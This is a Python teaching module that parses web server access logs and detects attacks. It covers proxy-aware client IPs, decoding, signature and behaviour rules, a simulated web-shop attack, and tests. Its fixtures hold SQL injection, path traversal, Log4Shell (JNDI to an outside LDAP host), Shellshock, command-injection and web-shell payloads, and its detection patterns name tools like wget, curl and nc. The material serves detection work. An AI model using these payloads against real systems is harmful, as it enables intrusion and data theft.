# Web server logs: a better parser, and rules for web attacks
#
# Every request to a web server (Apache, Nginx, and most others) is
# written to an ACCESS LOG, one line per request. Web servers face the
# whole internet, so their logs are where scanning, exploitation and
# password guessing show up first.
#
# rules.py has a SuspiciousRequestRule with a few patterns, and the
# learning repo's first ApacheParser was just as simple. Both are fine
# for a demo and easy to fool. This file has a parser and signatures
# that hold up against real traffic (WebAttackRule replaces
# SuspiciousRequestRule), and adds rules for how web attacks BEHAVE,
# not just what they look like.
#
# As with windows.py, everything becomes a LogEvent, so the rules
# that already exist work here unchanged: BruteForceRule catches
# password guessing against a website's login form, and the Correlator
# builds incidents from web alerts.
#
# Topics covered here:
#   1. What an access log line looks like, and which parts an attacker
#      controls (escaped quotes, garbage requests)
#   2. Who is the client? Load balancers and X-Forwarded-For
#   3. Decode before you match: percent-encoding, double encoding
#   4. The parser (and login forms turned into login events)
#   5. Signature rules, with severity from the response status
#   6. Behaviour rules: scanner tools, wordlist scanning, and password
#      guessing through the existing BruteForceRule
#   7. A full attack on a web shop, correlated into incidents
#   8. What access logs can't tell you
#   9. Practice, with tests
#
# GETTING REAL LOGS
# -----------------
#   Nginx:   /var/log/nginx/access.log      (format "combined" by default)
#   Apache:  /var/log/apache2/access.log    (Debian/Ubuntu)
#            /var/log/httpd/access_log      (RHEL/Fedora)
# Behind a load balancer, add the X-Forwarded-For header to the format
# (section 2). In Nginx:
#   log_format main '$remote_addr - $remote_user [$time_local] "$request" '
#                   '$status $body_bytes_sent "$http_referer" '
#                   '"$http_user_agent" "$http_x_forwarded_for"';
#
# All IPs here come from the ranges reserved for documentation
# (RFC 5737) or private ranges, so none belong to anyone.


import ipaddress
import re
from collections import defaultdict, deque, namedtuple
from datetime import datetime, timedelta, timezone
from urllib.parse import unquote, unquote_plus

from . import correlation
from .correlation import Correlator, SequencePattern, all_rules
from .events import LogEvent
from .parsers import LogParser, ParseError, detect_parser
from .rules import DetectionEngine, Rule, Severity, Timeline


# ---------------------------------------------------------------
# 1. What an access log line looks like
# ---------------------------------------------------------------
#
# The "combined" format, the default in Nginx and common in Apache:
#
#   203.0.113.9 - - [27/Nov/2026:14:00:05 +0000] "GET /search?q=shoes HTTP/1.1" 200 5120 "https://shop.example/" "Mozilla/5.0 ..."
#   |           | | |                            |                               |   |    |                       |
#   client IP   | | time (with its UTC offset)   request line                    |   |    referrer                user agent
#               | user, from HTTP basic auth ("-" = none)                        |   bytes sent
#               identd, always "-"                                               status code
#
# The older "common" format stops after the size. Nginx setups often
# add more quoted fields at the end, like X-Forwarded-For (section 2).
#
# WHICH PARTS DOES THE ATTACKER CONTROL? The request line, the referrer
# and the user agent: all three are text the client sends. So:
#
#   * They can contain QUOTES. The server escapes them: Apache writes
#     \" and Nginx writes \x22. A pattern like "[^"]*" stops at the first
#     \" and misreads the line (the old ApacheParser does this).
#   * The request line doesn't have to be HTTP at all. A scanner that
#     speaks TLS to a plain-HTTP port produces a request like
#     "\x16\x03\x01\x02\x00..." with status 400. That's a valid log line
#     for a broken request, not a broken log line.
#   * The path can contain spaces, which plain "\S+" can't handle.

ESCAPE = re.compile(r"\\(x[0-9a-fA-F]{2}|.)")
QUOTED = r'"(?P<{}>(?:[^"\\]|\\.)*)"'            # a quoted field that may hold \" escapes


def unescape(text):
    """Undo the escaping web servers apply: \\" -> ", \\\\ -> \\, \\x16 -> chr(0x16)."""
    def one(m):
        code = m.group(1)
        if len(code) == 3 and code[0] == "x":
            return chr(int(code[1:], 16))
        return {"n": "\n", "t": "\t"}.get(code, code)
    return ESCAPE.sub(one, text)


# ---------------------------------------------------------------
# 2. Who is the client?
# ---------------------------------------------------------------
#
# Behind a load balancer or reverse proxy, EVERY request reaches the web
# server from the proxy, so the first field of every line is the
# proxy's IP. Detection on that field sees one giant "client". The real
# client is in the X-Forwarded-For header, which each proxy extends:
#
#   X-Forwarded-For: <client>, <proxy 1>, <proxy 2>
#
# The catch: the client can send its own X-Forwarded-For, and proxies
# APPEND to it. An attacker sends "X-Forwarded-For: 127.0.0.1" and the
# load balancer passes on "127.0.0.1, 198.51.100.99". Trusting the
# leftmost entry lets anyone choose their own IP.
#
# The safe rule: start from the address that actually connected. While
# that address is one of YOUR proxies, step one entry left. The first
# address that isn't yours is the client, because only your own proxies
# can be trusted to have written the entries to their right.
#
# And with no trusted proxies configured, ignore X-Forwarded-For
# completely: from the internet it's just another header an attacker
# can type.

def parse_networks(items):
    return [ipaddress.ip_network(item, strict=False) for item in items]


def is_trusted(ip, networks):
    try:
        address = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(address in net for net in networks)


def client_ip(remote, forwarded_for, trusted):
    """The real client: step left through X-Forwarded-For only past trusted proxies."""
    if not forwarded_for or forwarded_for == "-":
        return remote
    chain = [hop.strip() for hop in forwarded_for.split(",") if hop.strip()]
    client = remote
    for hop in reversed(chain):
        if not is_trusted(client, trusted):
            break                                     # client is someone else: stop here
        try:
            ipaddress.ip_address(hop)
        except ValueError:
            break                                     # junk the client typed in the header
        client = hop
    return client


# ---------------------------------------------------------------
# 3. Decode before you match
# ---------------------------------------------------------------
#
# URLs are percent-encoded (python_learning_journey has a lesson on it):
# "../" can arrive as "%2e%2e%2f". A pattern looking for "../" in the
# RAW path misses it, but the application decodes it and opens the
# file anyway. So rules must look at the path the way the app sees it.
#
# Attackers also encode TWICE: "%252e" decodes to "%2e", which decodes
# to ".". Some apps decode twice (a proxy, then the framework), so a
# filter that decodes once is bypassed. We decode until nothing changes
# (at most 3 rounds), and count the rounds: real browsers almost never
# need more than one, so double encoding is itself worth mentioning.
#
# One subtlety: "+" means a space only in the QUERY string
# (?q=red+shoes), not in the path, so the two are decoded differently.

def decode_fully(text, plus=False, rounds=3):
    """Decode until stable. Returns (decoded text, number of rounds that changed it)."""
    decode = unquote_plus if plus else unquote
    layers = 0
    for _ in range(rounds):
        decoded = decode(text, errors="replace")
        if decoded == text:
            break
        text, layers = decoded, layers + 1
    return text, layers


def split_target(target):
    """'/a%20b?q=x+y' -> ('/a b', 'q=x y', layers)."""
    path, _, query = target.partition("?")
    path, path_layers = decode_fully(path)
    query, query_layers = decode_fully(query, plus=True)
    return path, query, max(path_layers, query_layers)


# ---------------------------------------------------------------
# 4. The parser
# ---------------------------------------------------------------
#
# Login forms: an access log never shows the password or whether it was
# right, only the response. Whether a POST to the login page FAILED
# depends on the application, so it's configuration, not code:
#   * many apps answer a failed login with 401 or 403, and a good one
#     with a redirect (302 or 303);
#   * WordPress answers a failed login with 200 (the form again, with an
#     error) and a good one with 302.
# Check what YOUR app does before trusting these. A response that is
# neither stays an ordinary request: guessing would turn server errors
# into "successful logins".

LoginForm = namedtuple("LoginForm", "failure success")

LOGIN_FORMS = {
    "/login": LoginForm(failure={401, 403}, success={302, 303}),
    "/wp-login.php": LoginForm(failure={200}, success={302}),
}


class WebAccessParser(LogParser):
    name = "web-access"

    LINE = re.compile(
        r"^(?P<remote>\S+) \S+ (?P<user>\S+) \[(?P<time>[^\]]+)\] "
        + QUOTED.format("request") + r" (?P<status>\d{3}) (?P<size>\d+|-)"
        + r"(?: " + QUOTED.format("referrer") + " " + QUOTED.format("agent")
        + r"(?: " + QUOTED.format("forwarded") + r")?)?\s*$")
    # A lazy target, then an optional protocol at the very end: the
    # target keeps any spaces in it, and stops right before " HTTP/1.1".
    REQUEST = re.compile(r"^(?P<method>[A-Z]{3,10}) (?P<target>.+?)(?: (?P<protocol>HTTP/\d(?:\.\d)?))?$")

    def __init__(self, trusted_proxies=(), login_forms=None, **kwargs):
        super().__init__(**kwargs)
        self.trusted = parse_networks(trusted_proxies)
        self.login_forms = LOGIN_FORMS if login_forms is None else login_forms

    @classmethod
    def looks_like(cls, line):
        return bool(cls.LINE.match(line))

    def parse_line(self, line):
        m = self.LINE.match(line)
        if not m:
            raise ParseError("not a web access log line")
        try:
            when = datetime.strptime(m["time"], "%d/%b/%Y:%H:%M:%S %z")
        except ValueError:
            raise ParseError(f"bad timestamp {m['time']!r}")

        status = int(m["status"])
        request = unescape(m["request"])
        forwarded = unescape(m["forwarded"] or "")
        ip = client_ip(m["remote"], forwarded, self.trusted)
        detail = {"status": status, "size": 0 if m["size"] == "-" else int(m["size"]),
                  "request": request, "agent": unescape(m["agent"] or ""),
                  "referrer": unescape(m["referrer"] or ""), "method": None,
                  "path": "", "query": "", "layers": 0, "malformed": False}
        if ip != m["remote"]:
            detail["via"] = m["remote"]                # the proxy it came through

        r = self.REQUEST.match(request)
        if r:
            path, query, layers = split_target(r["target"])
            detail.update(method=r["method"], path=path, query=query, layers=layers)
        else:
            detail["malformed"] = True                 # "-", TLS bytes, junk

        action = "http_request"
        outcome = "failure" if status >= 400 else "success"
        form = self.login_forms.get(detail["path"]) if detail["method"] == "POST" else None
        if form and status in form.failure | form.success:
            action = "login"
            outcome = "failure" if status in form.failure else "success"

        return LogEvent(time=when.astimezone(timezone.utc), source="web", action=action,
                        outcome=outcome, user=None if m["user"] == "-" else m["user"],
                        src_ip=ip, detail=detail)


# ---------------------------------------------------------------
# 5. Signature rules
# ---------------------------------------------------------------
#
# A SIGNATURE is a pattern that only attacks produce. They're matched on
# the DECODED path and query (section 3), and some also on the user
# agent and referrer, because attackers put payloads in headers too
# (Log4Shell and Shellshock spread mostly that way).
#
# Each pattern is written to avoid common false alarms; the tests check
# a few: a search for "how to select a union rep", the name O'Brien, and
# an ordinary "&id=5" in a query string.

SIGNATURES = {
    # ".." as a whole path segment, after a "/" or a "=" (?file=../..).
    "path-traversal": re.compile(r"(?:^|[/=])\.\.(?:/|$)"),
    "sensitive-file": re.compile(
        r"/(?:\.env(?!\w)|\.git/|\.svn/|\.aws/|\.ssh/|\.htpasswd|wp-config\.php|id_rsa"
        r"|etc/passwd|etc/shadow|web\.config)|\.(?:bak|old|swp|sql)$", re.IGNORECASE),
    "sql-injection": re.compile(
        r"\bunion\b(?:\s|/\*.*?\*/)+(?:all\s+)?select\b"         # UNION SELECT, UNION/**/SELECT
        r"|\binformation_schema\b"
        r"|\b(?:or|and)\s+'?(\w+)'?\s*=\s*'?\1\b"                 # OR 1=1, OR 'a'='a
        r"|\b(?:sleep|benchmark|pg_sleep)\s*\(|\bwaitfor\s+delay\b"  # time-based blind
        r"|;\s*(?:drop|delete|insert|update)\s"
        r"|'\s*(?:--|#)", re.IGNORECASE),                          # close the quote, comment out the rest
    "xss": re.compile(r"<\s*/?\s*script|javascript\s*:|\bon(?:error|load|mouseover|focus)\s*="
                      r"|<\s*(?:svg|iframe|img)\b", re.IGNORECASE),
    # A shell separator, then a command. "&" alone is left out: "&id=5" is normal.
    "command-injection": re.compile(r"(?:;|\|\|?|&&|`|\$\()\s*(?:cat|id|whoami|uname|wget|curl"
                                    r"|nc|ncat|bash|sh|python|perl)\b", re.IGNORECASE),
    # ${jndi:...}, and lookups nested to hide the word: ${${lower:j}ndi:...}
    "log4shell": re.compile(r"\$\{\s*(?:jndi\s*:|\$\{|(?:lower|upper|env|sys)\s*:)", re.IGNORECASE),
    "shellshock": re.compile(r"\(\)\s*\{\s*:\s*;\s*\}\s*;"),
}
# Where each one is looked for. Traversal and file names only mean
# something in the URL; a referrer is a URL too, so it's decoded first.
IN_HEADERS = {"sql-injection", "xss", "command-injection", "log4shell", "shellshock"}


def attack_categories(event):
    """[(category, where)] for every signature this request matches."""
    d = event.detail
    url = (d["path"] + ("?" + d["query"] if d["query"] else "")).replace("\\", "/")
    if d["malformed"]:
        url = d["request"]
    fields = {"url": url, "agent": d["agent"], "referrer": decode_fully(d["referrer"])[0]}
    found = []
    for category, pattern in SIGNATURES.items():
        for where, text in fields.items():
            if where != "url" and category not in IN_HEADERS:
                continue
            if pattern.search(text):
                found.append((category, where))
                break                                  # one hit per category is enough
    return found


# THE STATUS CODE SAYS WHETHER TO WORRY. Every server on the internet
# gets "../../etc/passwd" requests all day; nearly all get a 404. What
# matters is the answer:
#   2xx  the server answered normally: look at this now. The attack may
#        have worked (it's "look now", not "it worked": a search page
#        that answers 200 to any query will raise false alarms here)
#   5xx  the server broke: often a sign the input reached a database or
#        a shell, the usual first step of SQL injection
#   3xx, 4xx  refused or redirected: background noise
# A payload in a HEADER is different: the status of the page says
# nothing about whether the header was processed, so it's MEDIUM.

def severity_for_status(status):
    if 200 <= status < 300:
        return Severity.HIGH, "answered normally: check whether it worked"
    if status >= 500:
        return Severity.MEDIUM, "server error: the input reached something"
    return Severity.LOW, "refused"


class WebAttackRule(Rule):
    """Attack signatures in web requests, rated by how the server answered.

    One alert per (IP, category), and a new one only when the severity
    RISES: a scanner sending 300 injection attempts that all get 404 is
    one LOW alert, but the first one that gets a 200 is a new HIGH one.
    """
    name = "web-attack"
    severity = Severity.LOW

    def __init__(self):
        self._worst = {}                                # (ip, category) -> highest severity so far

    def process(self, event):
        if event.source != "web":
            return []
        alerts = []
        for category, where in attack_categories(event):
            if where == "url":
                severity, meaning = severity_for_status(event.detail["status"])
            else:
                severity, meaning = Severity.MEDIUM, f"payload in the {where}"
            key = (event.src_ip, category)
            if key in self._worst and self._worst[key] >= severity:
                continue
            self._worst[key] = severity
            d = event.detail
            shown = d["agent"] if where == "agent" else (d["path"] + ("?" + d["query"] if d["query"] else ""))
            if len(shown) > 70:
                shown = shown[:67] + "..."
            encoded = f", encoded {d['layers']}x" if d["layers"] >= 2 else ""
            alerts.append(self.alert(event, f"{category} from {event.src_ip}: {d['method'] or '?'} "
                                            f"{shown} -> {d['status']} ({meaning}{encoded})", severity))
        return alerts


# ---------------------------------------------------------------
# 6. Behaviour rules
# ---------------------------------------------------------------
#
# Signatures catch payloads. Some attacks have no payload at all: a
# scanner asking for 5,000 common file names, or a bot guessing
# passwords. Those are caught by what they DO.

class ScannerAgentRule(Rule):
    """A user agent that names an attack tool. One LOW alert per IP.

    Only lazy attackers leave the default user agent, and anyone can
    claim to be Chrome. So this finds the careless ones; it proves
    nothing about the rest.
    """
    name = "scanner-agent"
    severity = Severity.LOW

    TOOLS = re.compile(r"\b(sqlmap|nikto|nmap|masscan|zgrab|nuclei|gobuster|dirbuster|feroxbuster"
                       r"|ffuf|wfuzz|wpscan|acunetix|nessus|openvas|hydra)\b", re.IGNORECASE)

    def __init__(self):
        self._seen = set()

    def process(self, event):
        if event.source != "web" or event.src_ip in self._seen:
            return []
        m = self.TOOLS.search(event.detail["agent"])
        if not m:
            return []
        self._seen.add(event.src_ip)
        return [self.alert(event, f"{event.src_ip} is using {m[1].lower()} "
                                  f"({event.detail['agent'][:50]})")]


class ForcedBrowsingRule(Rule):
    """Wordlist scanning: one IP gets 404 for many DIFFERENT paths, fast.

    Counting distinct paths matters. A page with one broken image makes
    every visitor's browser ask for the same missing file again and
    again: lots of 404s, one path, not an attack.
    """
    name = "forced-browsing"
    severity = Severity.MEDIUM

    def __init__(self, threshold=20, window=timedelta(minutes=1)):
        self.threshold = threshold
        self.window = window
        self._misses = defaultdict(deque)
        self._flagged = set()

    def process(self, event):
        ip = event.src_ip
        if event.source != "web" or event.detail["status"] != 404 or not ip or ip in self._flagged:
            return []
        q = self._misses[ip]
        q.append(event)
        while event.time - q[0].time > self.window:
            q.popleft()
        paths = {e.detail["path"] or e.detail["request"] for e in q}
        if len(paths) < self.threshold:
            return []
        self._flagged.add(ip)
        seconds = int((event.time - q[0].time).total_seconds())
        return [self.alert(event, f"{ip} asked for {len(paths)} missing paths in {seconds}s "
                                  f"(e.g. {', '.join(sorted(paths)[:3])})", evidence=list(q))]


# PASSWORD GUESSING needs no new rule. The parser turns POSTs to a login
# form into action="login" events with an outcome (section 4), and the
# existing BruteForceRule counts failed logins per IP from ANY source:
# it can't tell a web form from SSH or RDP, and doesn't need to.


def web_rules():
    return [WebAttackRule(), ScannerAgentRule(), ForcedBrowsingRule()]


def rules_with_web():
    """Every rule so far, with WebAttackRule replacing SuspiciousRequestRule."""
    return [r for r in all_rules() if r.name != "suspicious-request"] + web_rules()


# Teach the Correlator what these rules mean in ATT&CK terms, and a
# sequence to look for: reconnaissance, then an attack, from one IP.
correlation.ATTACK.update({
    "web-attack":      ("T1190", "Initial Access", "Exploit Public-Facing Application"),
    "scanner-agent":   ("T1595.002", "Reconnaissance", "Active Scanning: Vulnerability Scanning"),
    "forced-browsing": ("T1595.003", "Reconnaissance", "Active Scanning: Wordlist Scanning"),
    "web-shell":       ("T1505.003", "Persistence", "Server Software Component: Web Shell"),
})
WEB_RECON_THEN_ATTACK = SequencePattern("web recon then attack",
                                        ({"scanner-agent", "forced-browsing"}, {"web-attack"}),
                                        timedelta(minutes=30))
if WEB_RECON_THEN_ATTACK not in correlation.PATTERNS:
    correlation.PATTERNS.append(WEB_RECON_THEN_ATTACK)   # the Correlator's default list


# ---------------------------------------------------------------
# 7. A full attack on a web shop
# ---------------------------------------------------------------
#
# shop.example sits behind a load balancer at 10.0.0.2. In 10 minutes:
#   * customers browse and one logs in (through the load balancer)
#   * 203.0.113.66 runs nikto straight at the server: a wordlist scan,
#     then SQL injection, then double-encoded path traversal that works
#     (200 with 1,840 bytes: /etc/passwd), with a fake X-Forwarded-For
#   * 198.51.100.77 sprays a Log4Shell payload in its user agent
#   * 198.51.100.88 speaks TLS to the HTTP port
#   * 198.51.100.99 guesses WordPress passwords through the load
#     balancer, gets in, and uploads a PHP file

LOAD_BALANCER = "10.0.0.2"
START = datetime(2026, 11, 27, 14, 0, tzinfo=timezone.utc)
BROWSER = "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0"
NIKTO = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007126)"
WORDLIST = ["admin", "backup", "old", "test", "dev", "phpmyadmin/", "pma/", "dbadmin/", "server-status",
            "config.php.bak", ".git/HEAD", ".env", "cgi-bin/test.cgi", "shell.php", "upload.php",
            "install.php", "setup/", "console", "manager/html", "api/v1/debug", "xmlrpc.php",
            ".DS_Store", "info.php", "phpinfo.php", "web.config"]


def escape(text):
    return text.replace("\\", "\\\\").replace('"', '\\"')        # as Apache writes it


def access_line(seconds, ip, request, status, size, agent=BROWSER, referrer="-", forwarded=None):
    when = START + timedelta(seconds=seconds)
    line = (f'{ip} - - [{when:%d/%b/%Y:%H:%M:%S %z}] "{escape(request)}" {status} {size} '
            f'"{escape(referrer)}" "{escape(agent)}"')
    if forwarded is not None:
        line += f' "{escape(forwarded)}"'
    return line


def via_lb(seconds, client, request, status, size, agent=BROWSER, sent=None):
    """A request through the load balancer; `sent` is an X-Forwarded-For the client typed."""
    chain = f"{sent}, {client}" if sent else client
    return access_line(seconds, LOAD_BALANCER, request, status, size, agent, forwarded=chain)


def shop_attack():
    lines = [
        via_lb(0, "192.0.2.10", "GET / HTTP/1.1", 200, 5120),
        via_lb(4, "192.0.2.10", "GET /products?id=3 HTTP/1.1", 200, 8211),
        via_lb(9, "192.0.2.11", "GET /search?q=how+to+select+a+union+rep HTTP/1.1", 200, 4410),
        via_lb(12, "192.0.2.11", "GET /search?q=O%27Brien HTTP/1.1", 200, 3982),
        via_lb(20, "192.0.2.10", "POST /login HTTP/1.1", 302, 0),
    ]
    lines += [via_lb(30 + i, "192.0.2.11", "GET /static/old-logo.png HTTP/1.1", 404, 153)
              for i in range(6)]                                    # one broken image, many 404s

    attacker = "203.0.113.66"
    for i, word in enumerate(WORDLIST):
        lines.append(access_line(60 + i, attacker, f"GET /{word} HTTP/1.1", 404, 153, NIKTO,
                                 forwarded="127.0.0.1"))             # a fake XFF: ignored
    lines += [
        access_line(120, attacker, "GET /products?id=3%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1",
                    500, 312, NIKTO),
        access_line(125, attacker, "GET /products?id=3%2520UNION%2520SELECT%2520username,password%2520FROM%2520users-- HTTP/1.1",
                    200, 8211, NIKTO),
        access_line(140, attacker, "GET /download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1",
                    200, 1840, NIKTO),
        access_line(150, "198.51.100.77", "GET / HTTP/1.1", 200, 5120,
                    agent="${jndi:ldap://203.0.113.200:1389/Exploit}"),
        # A TLS handshake sent to the HTTP port: Nginx logs the raw bytes as \xHH
        '198.51.100.88 - - [27/Nov/2026:14:02:40 +0000] "\\x16\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xfc\\x03\\x03" 400 157 "-" "-"',
    ]
    guesser = "198.51.100.99"
    for i in range(8):
        lines.append(via_lb(300 + 5 * i, guesser, "POST /wp-login.php HTTP/1.1", 200, 4120,
                            agent="python-requests/2.32.3", sent="127.0.0.1"))
    lines += [
        via_lb(345, guesser, "POST /wp-login.php HTTP/1.1", 302, 0, agent="python-requests/2.32.3"),
        via_lb(400, guesser, "POST /wp-admin/update.php?action=upload-plugin HTTP/1.1", 200, 2210),
        via_lb(430, guesser, "GET /wp-content/uploads/2026/11/cache.php?c=id HTTP/1.1", 200, 54),
    ]
    return lines


def run_shop(trusted_proxies=(LOAD_BALANCER,), extra_rules=()):
    lines = shop_attack()
    parser = WebAccessParser(trusted_proxies=trusted_proxies)
    events = Timeline(parser.parse(lines))
    alerts = DetectionEngine(rules_with_web() + list(extra_rules)).run(events)
    return parser, events, alerts


def section_1_to_3():
    tricky = [
        '192.0.2.5 - - [27/Nov/2026:14:00:00 +0000] "GET /a HTTP/1.1" 200 10 "-" "Bot \\"quoted\\" 1.0"',
        '192.0.2.5 - - [27/Nov/2026:14:00:01 +0000] "GET /my files/report.pdf HTTP/1.1" 200 10 "-" "-"',
        '198.51.100.88 - - [27/Nov/2026:14:00:02 +0000] "\\x16\\x03\\x01\\x02\\x00" 400 157 "-" "-"',
        '192.0.2.5 - - [27/Nov/2026:14:00:03 +0000] "GET /x HTTP/1.0" 200 10',     # "common" format
    ]
    parser = WebAccessParser()
    print("  1. Lines that trip up a simple pattern:")
    for e in parser.parse(tricky):
        d = e.detail
        print(f"     path={d['path']!r:<24} agent={d['agent']!r:<20} malformed={d['malformed']}")

    print("\n  2. Who is the client? (load balancer 10.0.0.2 trusted)")
    for remote, xff in (("10.0.0.2", "198.51.100.99"), ("10.0.0.2", "127.0.0.1, 198.51.100.99"),
                        ("203.0.113.66", "127.0.0.1"), ("10.0.0.2", "-")):
        print(f"     connected from {remote:<13} X-Forwarded-For {xff!r:<28} -> "
              f"{client_ip(remote, xff, parse_networks(['10.0.0.2']))}")

    print("\n  3. Decoding before matching:")
    for target in ("/download?file=../../etc/passwd", "/download?file=%2e%2e%2fetc%2fpasswd",
                   "/download?file=%252e%252e%252fetc%252fpasswd", "/search?q=red+shoes"):
        path, query, layers = split_target(target)
        print(f"     {target:<46} -> {path}?{query}  (decoded {layers}x)")


def section_7():
    parser, events, alerts = run_shop()
    print(f"  parsed {len(events)} requests ({parser})")
    print(f"  {len(alerts)} alerts:")
    for a in alerts:
        print(f"    {a}")
    incidents = Correlator().correlate(alerts)
    print(f"\n  -> {len(incidents)} incidents\n")
    for incident in incidents:
        print("  " + incident.report().replace("\n", "\n  "))
        print()

    # The same log without trusting the load balancer: every customer
    # and the password guesser look like ONE client, 10.0.0.2, and a
    # customer's ordinary login looks like the guesser getting in.
    _, _, blind = run_shop(trusted_proxies=())
    wrong = [a for a in blind if a.rule == "brute-force"]
    print("  Without trusting the load balancer:")
    for a in wrong:
        print(f"    {a}")


# ---------------------------------------------------------------
# 8. What access logs can't tell you
# ---------------------------------------------------------------
#
#   * POST BODIES aren't logged. SQL injection sent in a form field, and
#     the passwords guessed at a login form, never appear. Only the path
#     and the response do.
#   * Most HEADERS aren't logged: only the user agent and referrer (plus
#     whatever you add). A payload in a Cookie is invisible.
#   * The status code is the APP's answer, not the truth. An app that
#     answers every error with 200 hides failures; one that answers
#     everything with 404 hides successes.
#   * Signatures can always be evaded by someone patient: other
#     encodings, other SQL syntax, case tricks the app accepts. They
#     catch the bulk of automated attacks, which is most of them. That's
#     why the behaviour rules and the status code matter as much.
#   * Logs are written AFTER the response. They tell you what happened,
#     never stop it; that's a web application firewall's job.


# ---------------------------------------------------------------
# 9. Practice and tests
# ---------------------------------------------------------------
#
# Practice: write a WebShellRule. An attacker who can upload files
# uploads a script and then runs it by requesting it. Alert HIGH when a
# request for a script (.php, .phtml, .jsp, .jspx, .asp, .aspx) under an
# uploads folder gets a 2xx answer: upload folders should only ever
# serve images and documents. Solution: WebShellRule below.

class WebShellRule(Rule):
    name = "web-shell"
    severity = Severity.HIGH

    SCRIPT_IN_UPLOADS = re.compile(r"/uploads?/(?:.*/)?[^/]+\.(?:php\d?|phtml|jspx?|aspx?)$", re.IGNORECASE)

    def process(self, event):
        d = event.detail
        if event.source != "web" or not 200 <= d["status"] < 300:
            return []
        if self.SCRIPT_IN_UPLOADS.search(d["path"]):
            return [self.alert(event, f"{event.src_ip} ran {d['path']} from an uploads folder "
                                      f"-> {d['status']}")]
        return []


def make_event(target, status=404, agent=BROWSER, referrer="-", ip="192.0.2.1", seconds=0):
    line = access_line(seconds, ip, f"GET {target} HTTP/1.1", status, 10, agent, referrer)
    return WebAccessParser().parse_line(line)


def categories(target, **kwargs):
    return {c for c, _ in attack_categories(make_event(target, **kwargs))}


def run_tests():
    # Unescaping and parsing awkward lines
    assert unescape(r'say \"hi\" \\ \x41') == 'say "hi" \\ A'
    p = WebAccessParser()
    quoted, spaced, tls, common = list(p.parse([
        '192.0.2.5 - - [27/Nov/2026:14:00:00 +0000] "GET /a HTTP/1.1" 200 10 "-" "Bot \\"q\\" 1.0"',
        '192.0.2.5 - bob [27/Nov/2026:14:00:01 +0100] "GET /my files/r.pdf HTTP/1.1" 200 - "-" "-"',
        '198.51.100.88 - - [27/Nov/2026:14:00:02 +0000] "\\x16\\x03\\x01" 400 157 "-" "-"',
        '192.0.2.5 - - [27/Nov/2026:14:00:03 +0000] "GET /x HTTP/1.0" 200 10',
    ]))
    assert quoted.detail["agent"] == 'Bot "q" 1.0'
    assert spaced.detail["path"] == "/my files/r.pdf" and spaced.user == "bob"
    assert spaced.time == datetime(2026, 11, 27, 13, 0, 1, tzinfo=timezone.utc)   # +0100 -> UTC
    assert spaced.detail["size"] == 0
    assert tls.detail["malformed"] and tls.detail["method"] is None and tls.detail["request"] == "\x16\x03\x01"
    assert common.detail["agent"] == "" and common.detail["path"] == "/x"
    bad = WebAccessParser()
    assert list(bad.parse(["not a log line"])) == [] and bad.error_count == 1
    assert detect_parser(shop_attack()).name == "web-access"         # the old parser is retired

    # Who is the client?
    lb = parse_networks(["10.0.0.0/24"])
    assert client_ip("10.0.0.2", "198.51.100.9", lb) == "198.51.100.9"
    assert client_ip("10.0.0.2", "127.0.0.1, 198.51.100.9", lb) == "198.51.100.9"   # typed entry ignored
    assert client_ip("10.0.0.2", "198.51.100.9, 10.0.0.7", lb) == "198.51.100.9"   # two of our proxies
    assert client_ip("203.0.113.66", "127.0.0.1", lb) == "203.0.113.66"            # not our proxy
    assert client_ip("10.0.0.2", "not-an-ip", lb) == "10.0.0.2"
    assert client_ip("10.0.0.2", "198.51.100.9", []) == "10.0.0.2"                 # nothing trusted

    # Decoding
    assert decode_fully("%252e%252e%252f") == ("../", 2)
    assert split_target("/a+b?q=a+b%26c") == ("/a+b", "q=a b&c", 1)           # + is a space only in the query

    # Signatures: what they catch...
    assert categories("/download?file=..%2f..%2fetc%2fpasswd") == {"path-traversal", "sensitive-file"}
    assert categories("/static/..\\..\\web.config") == {"path-traversal", "sensitive-file"}
    assert categories("/.env") == {"sensitive-file"} and categories("/db.sql") == {"sensitive-file"}
    for sqli in ("/p?id=1 UNION SELECT 1,2", "/p?id=1/**/union/**/select/**/1", "/p?id=1' OR '1'='1",
                 "/p?id=1 or 1=1", "/p?id=1;DROP TABLE users", "/p?id=1 AND SLEEP(5)", "/login?u=admin'--"):
        assert "sql-injection" in categories(sqli), sqli
    assert "xss" in categories("/s?q=<script>alert(1)</script>")
    assert "xss" in categories("/s?q=%3Cimg%20src=x%20onerror=alert(1)%3E")
    assert "command-injection" in categories("/ping?host=1.1.1.1;cat /etc/passwd")
    assert "command-injection" in categories("/ping?host=$(whoami)")
    assert categories("/", agent="${jndi:ldap://x/a}") == {"log4shell"}
    assert categories("/", agent="${${lower:j}ndi:ldap://x/a}") == {"log4shell"}
    assert categories("/cgi-bin/x", agent="() { :; }; /bin/bash -c id") == {"shellshock"}
    assert categories("/", referrer="https://x/?q=%3Cscript%3E") == {"xss"}
    # ...and what they leave alone
    for normal in ("/search?q=how+to+select+a+union+rep", "/search?q=O%27Brien", "/p?cat=2&id=5",
                   "/environment", "/products?id=3", "/blog/2026/11/why-or-and-not", "/a.b/c..d/e"):
        assert categories(normal) == set(), normal

    # WebAttackRule: severity follows the status, and only rises
    rule = WebAttackRule()
    assert rule.process(make_event("/../../etc/passwd", 404))[0].severity is Severity.LOW
    assert rule.process(make_event("/../etc/passwd", 404, seconds=1)) == []         # same again: quiet
    assert rule.process(make_event("/p?id=1 UNION SELECT 1", 500, seconds=2))[0].severity is Severity.MEDIUM
    hit = rule.process(make_event("/x?f=%252e%252e%252fetc%252fpasswd", 200, seconds=3))
    assert {a.severity for a in hit} == {Severity.HIGH} and "encoded 2x" in hit[0].summary
    assert WebAttackRule().process(make_event("/", 200, agent="${jndi:x}"))[0].severity is Severity.MEDIUM

    # Behaviour rules
    scan = [make_event(f"/{w}", 404, seconds=i) for i, w in enumerate(WORDLIST)]
    browse = ForcedBrowsingRule()
    assert sum(len(browse.process(e)) for e in scan) == 1
    same = ForcedBrowsingRule()
    assert sum(len(same.process(make_event("/logo.png", 404, seconds=i))) for i in range(50)) == 0
    slow = ForcedBrowsingRule()
    assert sum(len(slow.process(make_event(f"/{w}", 404, seconds=10 * i)))
               for i, w in enumerate(WORDLIST)) == 0                   # 25 paths over 4 minutes
    tools = ScannerAgentRule()
